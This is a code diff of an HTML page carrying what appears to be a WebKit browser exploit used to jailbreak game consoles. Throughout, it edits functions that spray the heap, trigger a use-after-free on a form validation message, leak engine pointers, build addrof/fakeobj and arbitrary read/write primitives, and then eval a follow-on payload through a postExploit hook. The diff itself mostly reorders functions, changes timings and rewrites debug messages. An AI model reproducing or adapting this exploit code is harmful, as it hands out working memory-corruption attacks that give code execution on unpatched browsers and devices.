@@ -5,7 +5,7 @@
 <body style="color:white;font-size:15px">
   <style>
       body {
-	background: linear-gradient(#000, #007);
+	background: black;
 	}
   </style>
   <script>
@@ -13,7 +13,27 @@ if(document.cookie.indexOf('kex=0') >= 0)
     document.location.href = 'index.html';
 </script>
 <script>
-
+function reuseTargetObj() {
+               document.documentElement.appendChild(g_input);
+         	for (let i = 0xfa0 / 2 - 0x10; i < 0xfa0 / 2 + 0x10; i++)
+		g_frames[i].setAttribute("rows", ',');
+	for (let i = 0; i < 0x8000; i++) {
+		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
+		let view = new Float64Array(ab);
+		view[0] = guess_htmltextarea_addr.asDouble();
+		view[3] = guess_htmltextarea_addr.asDouble();
+		g_arr_ab_1.push(view);
+	}
+	if (g_round == 1) {
+		sprayStringImpl(0, 0x1000);
+		g_frames = [];
+		g_round += 1;
+		g_input = input3;
+		setTimeout(confuseTargetObjRound1, 10);
+	} else {
+		setTimeout(confuseTargetObjRound2, 10);
+	}
+}
 function die(msg) {
 	alert(msg);
 	undefinedFunction();
@@ -341,11 +361,9 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
-	debug_log("[+] WEB-Exploit worked great. Loading HEN. Please Wait...");
-	  			if(window.postExploit)
+			if(window.postExploit)
 		window.postExploit();
 }
-
 function read(addr, length) {
 	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + 0x10 + i] = addr.byteAt(i);
@@ -389,7 +407,7 @@ function cleanup() {
 	g_rows1 = null;
 	g_rows2 = null;
 	g_frames = null;
-		if(window.midExploit)
+   			if(window.midExploit)
 		window.midExploit();
 }
 function confuseTargetObjRound2() {
@@ -470,7 +488,7 @@ function confuseTargetObjRound1() {
 	sprayStringImpl(0x1000, 0x1000 * 2);
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
-		dumpTargetObj();
+	dumpTargetObj();
 	g_fake_validation_message[4] = g_timer_leak.add(0x48 * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - 0x10).asDouble();
 	setTimeout(leakJSC, 6000);
 }
@@ -478,40 +496,15 @@ function handle2() {
 	input2.focus();
 }
 
-function multik(){
-reuseTargetObj();
-}
-function reuseTargetObj() {
-	document.body.append(g_input);
-	document.body.append(g_input);
-		debug_log("[+] Yes Yes Yes. Congratulations!");
-	for (let i = 0xfa0 / 2 - 0x10; i < 0xfa0 / 2 + 0x10; i++)
-		g_frames[i].setAttribute("rows", ',');
-	for (let i = 0; i < 0x8000; i++) {
-		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
-		let view = new Float64Array(ab);
-		view[0] = guess_htmltextarea_addr.asDouble();
-		view[3] = guess_htmltextarea_addr.asDouble();
-		g_arr_ab_1.push(view);
-	}
-	if (g_round == 1) {
-		sprayStringImpl(0, 0x1000);
-		g_frames = [];
-		g_round += 1;
-		g_input = input3;
-		setTimeout(confuseTargetObjRound1, 1);
-	} else {
-		setTimeout(confuseTargetObjRound2, 1);
-	}
-	
-}
 function dumpTargetObj() {
-
+	debug_log("[+] m_timer: " + g_timer_leak);
+	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
-
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
+			debug_log("[+] Found fake ValidationMessage");
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
@@ -540,20 +533,18 @@ function prepareUAF() {
 	g_input.reportValidity();
 	for (let i = 0xfa0 / 2; i < 0xfa0; i++)
 		g_frames[i].setAttribute("rows", g_rows2);
-		g_input.setAttribute("onfocus", "reuseTargetObj();");
-			g_input.autofocus = true;
-		debug_log("[+] Not enough free RAM. Pancake!");
+			g_input.setAttribute("onfocus", "reuseTargetObj()");
+	g_input.autofocus = true;
 }
 function sprayHTMLTextArea() {
-	debug_log("[+] Spraying HTMLTextareaElement Created by!");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 	let textarea_div_elem = window.xyu = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	let element = document.createElement("textarea");
 	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';
 	for (let i = 0; i < 0x6000; i++)
-		textarea_div_elem.appendChild(element.cloneNode());
-
+	textarea_div_elem.appendChild(element.cloneNode());
 }
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
@@ -562,10 +553,11 @@ function sprayStringImpl(start, end) {
 	}
 }
 function go() {
-	sprayHTMLTextArea();
+      sprayHTMLTextArea();
+	
 		g_input = input1;
-		prepareUAF();
-	}
+	prepareUAF();
+}
 </script>
 <script>
 function print(){}
@@ -594,7 +586,7 @@ window.postExploit = function()
         eval.call(window, scriptCode);
     }, 100);
 };
-   setTimeout(go, 500);
+   setTimeout(go, 200);
 
 </script>
 <button id="input1" onfocus="handle2()"></button>
